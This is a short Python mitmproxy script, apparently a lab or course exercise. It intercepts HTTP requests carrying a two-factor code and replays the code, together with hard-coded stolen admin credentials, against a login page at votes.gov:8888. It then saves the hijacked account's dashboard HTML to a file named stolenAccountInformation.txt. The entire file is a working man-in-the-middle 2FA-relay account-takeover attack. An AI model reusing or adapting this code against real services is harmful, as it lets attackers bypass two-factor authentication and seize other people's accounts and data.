import requests

def is_code(request):
    return "code=" in request.get_text()

def request(flow):
    request = flow.request

    if(is_code(request)):
        twofaCode = request.get_text().split('=')[1]
        file = open("stolenAccountInformation.txt", "w")
        file.write(f"2FA Code Found: {twofaCode}\n")
        url = "http://votes.gov:8888"
        # Here we input the credentials that were compromised at a previous time
        payload = { "username" : "admin", "password" : "password" }
        file.write("Logging into site using stolen credentials...\n")
        # Login using a POST request and save the 2FA page URL it directs us to
        twofa_url = requests.post(url, data = payload).url
        twofa_payload = { "code" : twofaCode }
        file.write(f"Submitting {twofaCode} to received 2FA page url: {twofa_url} ...\n")
        # Submit the stolen 2FA code and gain access to the account dashboard and it's information
        account_page = requests.post(twofa_url, data = twofa_payload)
        file.write("Successfully hijacked account, account dashboard HTML:\n\n")
        file.write(account_page.text + "\n")
